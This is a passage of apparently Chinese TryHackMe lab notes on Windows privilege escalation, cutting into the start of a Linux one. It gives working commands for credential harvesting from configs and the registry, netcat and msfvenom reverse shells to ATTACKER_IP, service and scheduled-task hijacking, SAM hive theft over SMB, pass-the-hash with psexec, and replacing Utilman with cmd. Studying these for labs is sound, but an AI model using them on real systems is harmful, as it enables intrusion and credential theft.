cmd.exe<br></code></pre></td></tr></table></figure><h6 id="IIS配置"><a href="#IIS配置" class="headerlink" title="IIS配置"></a>IIS配置</h6><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\Config\web.config | findstr connectionString<br>或者这个路径：<span class="hljs-name">C</span>:\inetpub\wwwroot\web.config<br></code></pre></td></tr></table></figure><h6 id="如果安装了PuTTY"><a href="#如果安装了PuTTY" class="headerlink" title="如果安装了PuTTY"></a>如果安装了PuTTY</h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ <span class="hljs-string">/f</span> <span class="hljs-string">&quot;Proxy&quot;</span> <span class="hljs-string">/s</span><br><span class="hljs-string">//Simon</span> Tatham是PuTTY的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。<br>正如 putty 存储凭据一样，任何存储密码的软件（包括浏览器、电子邮件客户端、FTP 客户端、SSH 客户端、VNC 软件等）都将具有恢复用户保存的任何密码的方法。<br></code></pre></td></tr></table></figure><h6 id="winPEAS"><a href="#winPEAS" class="headerlink" title="winPEAS"></a>winPEAS</h6><h6 id="powerup-ps1"><a href="#powerup-ps1" class="headerlink" title="powerup.ps1"></a>powerup.ps1</h6><p><a href="https://cloud.tencent.com/developer/article/1669640">https://cloud.tencent.com/developer/article/1669640</a></p><h5 id="快速提权"><a href="#快速提权" class="headerlink" title="快速提权"></a>快速提权</h5><h6 id="Scheduled-Tasks计划任务"><a href="#Scheduled-Tasks计划任务" class="headerlink" title="Scheduled Tasks计划任务"></a>Scheduled Tasks计划任务</h6><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta">#schtasks</span><br>出来一大堆，肉眼排除系统自带的计划任务，找到一个看起来像人为自定义的Taskname<br><span class="hljs-comment">//这个命令用于查询计划任务详细信息</span><br><span class="hljs-meta">#schtasks /query /tn $Taskname /fo list /v</span><br>输出了该计划任务所需可执行文件的存储目录，比如说C:\tasks\schtask.bat<br><span class="hljs-comment">//检查该可执行文件的权限</span><br><span class="hljs-meta">#icacls c:\tasks\schtask.bat</span><br><span class="hljs-symbol">c:</span>\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)<br>                    BUILTIN\Administrators:(I)(F)<br>                    BUILTIN\Users:(I)(F)<br><span class="hljs-comment">//BUILTIN\Users组(目前用户属于的组)对任务的二进制文件具有完全访问权限（F）。这意味着我们可以修改.bat文件并插入我们喜欢的任何payload。这里可以kali生成一个反弹shell,kali起smb服务，windows下载</span><br><span class="hljs-symbol">windows:</span><span class="hljs-meta">#echo c:\tools\nc64.exe -e cmd.exe $ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</span><br><span class="hljs-symbol">kali:</span><span class="hljs-meta">#nc -lvp 4444 <span class="hljs-comment">//开启监听</span></span><br><span class="hljs-comment">//不想等，手动激活计划任务</span><br><span class="hljs-meta">#schtasks /run /tn $taskname</span><br>得到shell <span class="hljs-meta">#dir /s C:\flag* 全局找flag</span><br></code></pre></td></tr></table></figure><h6 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h6><p>Windows 安装程序文件（也称为.msi文件）用于在系统上安装应用程序。</p><p>可以将这些.msi配置为从任何用户帐户以更高的权限运行。</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">//配置两个注册表值，先看行不行，thm靶机就已经不支持了<br><span class="hljs-name">C</span>:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br><span class="hljs-name">C</span>:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure><p>生成马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=ATTACKING_10.10.156.205 <span class="hljs-attribute">LPORT</span>=LOCAL_PORT -f msi -o malicious.msi<br></code></pre></td></tr></table></figure><p>smb上传略</p><p>激活马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br></code></pre></td></tr></table></figure><h5 id="windows服务"><a href="#windows服务" class="headerlink" title="windows服务"></a>windows服务</h5><h6 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h6><p>Windows 服务由<strong>服务控制管理器</strong> （SCM） 管理。</p><p>每个服务都有一个关联的可执行文件，每当启动服务时，SCM 都会运行该可执行文件。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> <span class="hljs-keyword">query</span>  <span class="hljs-comment">//查看所有服务</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ada">//查询特定服务<br>sc qc camsvc<br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: camsvc<br>        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">20</span>  WIN32_SHARE_PROCESS<br>        START_TYPE         : 3   <span class="hljs-type">DEMAND_START</span><br>        ERROR_CONTROL      : 1   <span class="hljs-type">NORMAL</span><br>        BINARY_PATH_NAME   : <span class="hljs-type">C</span>:\Windows\system32\svchost.exe -k appmodel -p<br>        LOAD_ORDER_GROUP   :<br>        <span class="hljs-type">TAG</span>                : 0<br>        DISPLAY_NAME       : <span class="hljs-type">Capability</span> <span class="hljs-keyword">Access</span> Manager Service<br>        DEPENDENCIES       :<br>        <span class="hljs-type">SERVICE_START_NAME</span> : <span class="hljs-type">LocalSystem</span><br></code></pre></td></tr></table></figure><p>关联的可执行文件：<strong>BINARY_PATH_NAME</strong> </p><p>用于运行服务的帐户： <strong>SERVICE_START_NAME</strong> </p><p>win+R图形化注册表：服务的所有配置文件都放在：regedit    —》HKLM\SYSTEM\CurrentControlSet\Services\</p><p>然后可以在<strong>ImagePath</strong> 值上看到关联的可执行文件，在 <strong>ObjectName</strong> 值上看到用于启动服务的帐户</p><h6 id="通过服务提权："><a href="#通过服务提权：" class="headerlink" title="通过服务提权："></a><strong>通过服务提权</strong>：</h6><p>目前权限：wprivesc1\thm-unpriv</p><p>通过sc query,发现了一堆服务，然后一个一个sc qc $服务名，大多数用于运行服务的帐户都是localsystem，但是找到了一个WindowsScheduler服务，用户为.\svcusr1  就提他。</p><p>sc qc得到的信息还有关联的可执行文件路径C:\PROGRA<del>2\SYSTEM</del>1\WService.exe，于是icacls查看他的执行权限。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">thm</span><span class="hljs-operator">-</span><span class="hljs-variable">unpriv</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">icacls</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PROGRA</span><span class="hljs-operator">~</span><span class="hljs-number">2</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>\<span class="hljs-variable">WService</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><br><span class="hljs-variable">icacls</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PROGRA</span><span class="hljs-operator">~</span><span class="hljs-number">2</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>\<span class="hljs-variable">WService</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><br><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PROGRA</span><span class="hljs-operator">~</span><span class="hljs-number">2</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>\<span class="hljs-variable">WService</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span> <span class="hljs-variable">Everyone</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">M</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">NT</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">SYSTEM</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">F</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">BUILTIN</span>\<span class="hljs-variable">Administrators</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">F</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">BUILTIN</span>\<span class="hljs-variable">Users</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">RX</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGE</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">ALL</span> <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGES</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">RX</span><span class="hljs-punctuation">)</span><br>                                  <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGE</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">ALL</span> <span class="hljs-variable">RESTRICTED</span> <span class="hljs-variable">APPLICATION</span> <span class="hljs-variable">PACKAGES</span><span class="hljs-operator">:</span><span class="hljs-punctuation">(</span><span class="hljs-built_in">I</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-variable">RX</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p>“Everyone”组对服务的可执行文件具有修改权限 （M）。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它</p><p><strong>icacls命令详解</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">在 icacls 命令中，括号中的大写字母代表不同的权限标识符。下面是常见的一些权限标识符及其含义：<br><br>F：完全控制（<span class="hljs-keyword">Full</span> control）<br>M：修改（Modify）<br>RX：读取和执行（<span class="hljs-keyword">Read</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">execute</span>）<br>R：只读（<span class="hljs-keyword">Read</span>）<br>W：写入（<span class="hljs-keyword">Write</span>）<br>N：无权限（<span class="hljs-keyword">None</span>）<br>OI：继承对象（<span class="hljs-keyword">object</span> <span class="hljs-keyword">inherit</span>）<br>CI：继承容器（container <span class="hljs-keyword">inherit</span>）<br>IO：继承仅限（<span class="hljs-keyword">inherit</span> <span class="hljs-keyword">only</span>）<br>GA：通用访问（generic <span class="hljs-keyword">all</span>）<br>GR：通用读取（generic <span class="hljs-keyword">read</span>）<br>GW：通用写入（generic <span class="hljs-keyword">write</span>）<br>GX：通用执行（generic <span class="hljs-keyword">execute</span>）<br>这些权限标识符可以在 icacls 命令中使用，通过为文件或目录指定适当的权限标识符来管理其访问权限。例如，使用以下命令将 &quot;example.txt&quot; 文件的权限设置为只读：<br><br>icacls example.txt /<span class="hljs-keyword">grant</span> Users:R<br><br>上述命令中，&quot;Users&quot; 是用户组，&quot;R&quot; 是只读权限标识符。<br>请注意，在使用 icacls 命令时，确保理解每个权限标识符的含义并谨慎操作，以免误操作导致权限问题。建议在使用该命令进行权限管理之前备份相关文件或目录。<br></code></pre></td></tr></table></figure><p>核心思路：篡改可执行文件为反弹马，然后重启服务。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>.生成反弹马<br>msfvenom -<span class="hljs-keyword">p</span> windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4445</span> -<span class="hljs-keyword">f</span> <span class="hljs-keyword">exe</span>-service -<span class="hljs-keyword">o</span> rev-svc.<span class="hljs-keyword">exe</span><br><span class="hljs-number">2</span>.<span class="hljs-keyword">python3</span>到目标机wget http://xxx/xxx -O xxx.<span class="hljs-keyword">exe</span>  //wget 必须加O不然执行不了<br><span class="hljs-number">3</span>.把C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.<span class="hljs-keyword">exe</span>篡改为rev-svc.<span class="hljs-keyword">exe</span>（改名为WService.<span class="hljs-keyword">exe</span>）cmd的<span class="hljs-keyword">move</span>命令<br><span class="hljs-number">4</span>.给所有人权限icacls WService.<span class="hljs-keyword">exe</span> /grant Everyone:F<br><span class="hljs-number">5</span>.kali nc监听<br><span class="hljs-number">6</span>.cmd中重启服务（powershell的sc好像有点问题）<br>C:\&gt; sc <span class="hljs-keyword">stop</span> windowsscheduler<br>C:\&gt; sc start windowsscheduler<br><span class="hljs-number">7</span>.获得<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p>移动文件时重命名文件 ren xxx.exe bbb.exe</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ws-%E6%8F%90%E6%9D%83/image-20231018162346580.png" alt="image-20231018162346580"></p><h6 id="未带引号的服务路径"><a href="#未带引号的服务路径" class="headerlink" title="未带引号的服务路径"></a>未带引号的服务路径</h6><p>找到一个服务叫Disk Sorter Enterprise</p><p>查询他的信息时需要加引号不然查不到他</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ada">sc qc <span class="hljs-string">&quot;Disk Sorter Enterprise&quot;</span><br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: Disk Sorter Enterprise<br>        <span class="hljs-keyword">TYPE</span>               <span class="hljs-type">: </span><span class="hljs-number">10</span>  WIN32_OWN_PROCESS <br>        START_TYPE         : 2   <span class="hljs-type">AUTO_START</span><br>        ERROR_CONTROL      : 0   <span class="hljs-type">IGNORE</span><br>        BINARY_PATH_NAME   : <span class="hljs-type">C</span>:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe<br>        LOAD_ORDER_GROUP   : <br>        <span class="hljs-type">TAG</span>                : 0<br>        DISPLAY_NAME       : <span class="hljs-type">Disk</span> Sorter Enterprise<br>        DEPENDENCIES       : <br>        <span class="hljs-type">SERVICE_START_NAME</span> : .\<span class="hljs-type">svcusr2</span><br></code></pre></td></tr></table></figure><p>BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</p><p>可以icacls C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe  查到这个exe并没有我当前低权用户的权限，但是服务名中间有空格，可以用未带引号的服务路径提权。</p><p>原理</p><p>sc start “Disk Sorter Enterprise” 时，会先往上翻3级目录(<code>字符串中间有两个空格，2+1=3</code>)，查有没有Disk.exe可执行文件，所以只要把上面生成的反弹马放到MyPrograms目录下即可，其余与上面服务提权一致。</p><h6 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h6><p>如果服务 DACL（不是服务的可执行文件的 DACL）允许您修改服务的配置，您将能够<strong>重新配置服务。</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">从命令行检查服务DACL<br><span class="hljs-selector-id">#cd</span> C:\tools\AccessChk<br><span class="hljs-selector-id">#accesschk64</span><span class="hljs-selector-class">.exe</span> -qlc $服务名    <span class="hljs-comment">//重点查看非管理员权限有没有SERVICE_ALL_ACCESS</span><br></code></pre></td></tr></table></figure><p>发现一个叫thmservice的服务可以搞，于是上传反弹马，icacls设置权限，用以下命令设置服务的可执行文件路径，攻击机监听，重启服务即可。</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">sc</span> <span class="hljs-variable">config</span> <span class="hljs-title class_">THMService</span> <span class="hljs-variable">binPath</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\f</span>antanmapath<span class="hljs-char escape_">\f</span>antan.exe&quot;</span> <span class="hljs-variable">obj</span><span class="hljs-operator">=</span> <span class="hljs-title class_">LocalSystem</span><br><span class="hljs-comment">//相当于把sc qc中的BINARY_PATH_NAME改了</span><br></code></pre></td></tr></table></figure><h5 id="危险特权"><a href="#危险特权" class="headerlink" title="危险特权"></a>危险特权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure><p><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants</a>  windows特权解释表</p><h6 id="SE-BACKUP-NAME-SE-RESTORE-NAME"><a href="#SE-BACKUP-NAME-SE-RESTORE-NAME" class="headerlink" title="SE_BACKUP_NAME &amp;&amp; SE_RESTORE_NAME"></a><strong>SE_BACKUP_NAME</strong> &amp;&amp; <strong>SE_RESTORE_NAME</strong></h6><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的 DACL。</p><p>此特权的<strong>应用场景</strong>是允许某些用户从系统执行<strong>备份</strong>，而无需完全管理权限。</p><p><strong>利用方式</strong>：直接拖windows administrator的hash值到kali本地，然后连接</p><p><strong>smb实验</strong>！！！以及<strong>windows给kali传文件</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#whoami</span> /priv<br>得到用户有SE_BACKUP_NAME &amp;&amp; SE_RESTORE_NAME权限<br><br><span class="hljs-comment">//备份SAM 和SYSTEM hashes</span><br><span class="hljs-selector-id">#reg</span> save hklm\system C:\Users\THMBackup\system<span class="hljs-selector-class">.hive</span><br><span class="hljs-selector-id">#reg</span> save hklm\sam C:\Users\THMBackup\sam<span class="hljs-selector-class">.hive</span><br><br><span class="hljs-comment">//攻击机使用脚本启用smb服务</span><br><span class="hljs-selector-id">#mkdir</span> share<br><span class="hljs-selector-id">#python3</span> /root/下载/impacket/smbserver<span class="hljs-selector-class">.py</span> -smb2support -username THMBackup -password CopyMaster555 public share<br><br><span class="hljs-comment">//目标机使用以下命令复制到攻击机的share文件夹中</span><br>C:\&gt; copy C:\Users\THMBackup\sam<span class="hljs-selector-class">.hive</span> \\ATTACKER_IP\public\<br>C:\&gt; copy C:\Users\THMBackup\system<span class="hljs-selector-class">.hive</span> \\ATTACKER_IP\public\<br><br><span class="hljs-comment">//kali中cd进入share文件夹,使用脚本导出hash</span><br>python3 /root/下载/impacket/secretsdump<span class="hljs-selector-class">.py</span> -sam sam<span class="hljs-selector-class">.hive</span> -system system<span class="hljs-selector-class">.hive</span> LOCAL<br><br><span class="hljs-comment">//拿取到的admin的hash值连攻击机，还是脚本</span><br>python3 ../psexec<span class="hljs-selector-class">.py</span> -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">8</span>f81ee5558e2d1205a84d07b0e3b34f5 administrator@目标机ip<br></code></pre></td></tr></table></figure><h6 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h6><p>成为文件的所有者并不一定意味着您拥有文件的权限，但作为所有者，您可以为自己分配所需的任何权限</p><p>SeTakeOwnership特权允许用户获得系统上<strong>任何对象的所有权</strong>，包括<strong>文件和注册表</strong>项，为攻击者提升特权提供了许多可能性，例如，我们可以搜索作为SYSTEM运行的服务并取得服务的可执行文件的所有权。但是，对于这项任务，我们将采取不同的路线。</p><p>Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：<code>utilman.exe</code></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ws-%E6%8F%90%E6%9D%83/image-20231017014503241.png" alt="image-20231017014503241"></p><p>实验过程</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">//</span>发现存在该特权<br><span class="hljs-comment">#whoami /priv</span><br><br>PRIVILEGES INFORMATION<br><span class="hljs-params">----------------------</span><br><br>Privilege Name                Description                              State<br>============================= ======================================== ========<br>SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled<br><br><span class="hljs-string">//</span>获得所有权<br><span class="hljs-comment">#takeown /f C:\Windows\System32\Utilman.exe</span><br><br><span class="hljs-string">//</span>给自己分配完全使用权<br><span class="hljs-comment">#icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><br><span class="hljs-string">//</span>覆盖cmd到utilman中  注意上方命令全部都是在C:\Windows\System32\文件夹中运行的<br><span class="hljs-comment">#copy cmd.exe utilman.exe</span><br><br><span class="hljs-string">//</span>点击左下角、点击头像、点击锁屏、点击utilman图标激活<span class="hljs-string">.exe</span>文件<br></code></pre></td></tr></table></figure><h6 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h6><p>rogueWinRM提权</p><p><a href="https://cn-sec.com/archives/244201.html">https://cn-sec.com/archives/244201.html</a></p><p>目标机执行以下命令，kali监听即可提权</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">c:\tools\RogueWinRM\RogueWinRM<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;C:\tools\nc64.exe&quot;</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-string">&quot;-e cmd.exe ATTACKER_IP 4442&quot;</span><br></code></pre></td></tr></table></figure><h5 id="易受攻击的软件"><a href="#易受攻击的软件" class="headerlink" title="易受攻击的软件"></a>易受攻击的软件</h5><p>&#x2F;&#x2F;列出目标系统上安装的软件及其版本，不是很全，还可以检查桌面快捷方式、可用服务</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span>,vendor<br></code></pre></td></tr></table></figure><p>然后上exploitdb找</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme_linux_提权</title>
    <link href="/2023/08/08/tryhackme-linux-%E6%8F%90%E6%9D%83/"/>
    <url>/2023/08/08/tryhackme-linux-%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>前提：已取得低权用户shell</p><p>关键元素：目标系统的具体配置、内核版本、安装的应用程序、支持的编程语言、其他用户的密码</p><h5 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">    hostname<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>可以提供有关目标系统在企业网络中的角色的信息（例如，生产 <span class="hljs-keyword">SQL</span> 服务器的 <span class="hljs-keyword">SQL</span><span class="hljs-operator">-</span>PROD<span class="hljs-number">-01</span>）<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br>将打印系统信息，为我们提供有关系统使用的内核的其他详细信息。在搜索可能导致权限提升的任何潜在内核漏洞时，这将非常有用。<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">cat /<span class="hljs-built_in">proc</span>/version<br><span class="hljs-built_in">proc</span> 文件系统 （procfs） 提供有关目标系统进程的信息。你会发现许多不同的<span class="hljs-title class_">Linux</span>风格的<span class="hljs-built_in">proc</span>，使其成为你武器库中必不可少的工具。<br>可能会为您提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 <span class="hljs-variable constant_">GCC</span>）<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/issue<br>是一个用于显示操作系统登录提示信息的文件，通常在用户登录时显示。它的内容可以包含系统信息、欢迎词或其他与登录相关的信息。<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">ps -<span class="hljs-selector-tag">A</span>：这个命令将显示所有正在执行的进程，不区分终端会话。它将列出每个进程的进程ID（PID）和进程名。<br>ps axjf：这个命令将显示更详细的进程信息，包括进程树结构和父子关系。<span class="hljs-selector-tag">a</span> 参数表示显示所有用户的进程，<span class="hljs-attribute">x</span> 参数表示显示没有控制终端的进程，j 参数用于显示进程树状结构。<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span><br>输出将包括所有可用环境变量和它们的值。这些值可能包括系统路径、语言设置、用户密码和其他敏感信息<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br>列出当前用户可使用 <span class="hljs-built_in">sudo</span> 